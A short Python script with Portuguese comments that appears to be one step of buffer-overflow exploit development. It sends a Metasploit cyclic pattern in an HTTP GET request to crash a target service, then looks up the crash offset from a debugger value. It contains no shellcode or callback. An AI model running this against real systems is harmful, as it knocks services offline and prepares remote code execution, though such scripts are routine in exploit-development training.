#!/usr/bin/python

import argparse
import socket
import subprocess
import time

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão de teste para um servidor e encontrar o offset de crash.")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("msf_bytes", type=str, help="Quantidade de bytes para o msf-pattern")

# Analisar os argumentos
args = parser.parse_args()

# Variáveis de entrada
# MFS PAYLOAD OFFSET
command = f"msf-pattern_create -l {args.msf_bytes}"

# Executar o comando e capturar a saída
payload = "GET "  # Único ponto de envio de dados para aplicação
payload += subprocess.run(command, capture_output=True, text=True, shell=True).stdout
payload += " HTTP/1.1\r\n\r\n" # Através da requisição HTTP

client_ip = args.client_ip
client_port = args.client_port

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    client.send(payload.encode())
    time.sleep(10)
except ConnectionResetError:
    print(f"Reset Error!")


hex_offset = input("Digite aqui o número que apareceu no Debugger: ")
command2 = f"msf-pattern_offset -q {hex_offset}"
dec_offset = subprocess.run(command2, capture_output=True, text=True, shell=True).stdout
print(f"\n {dec_offset}")
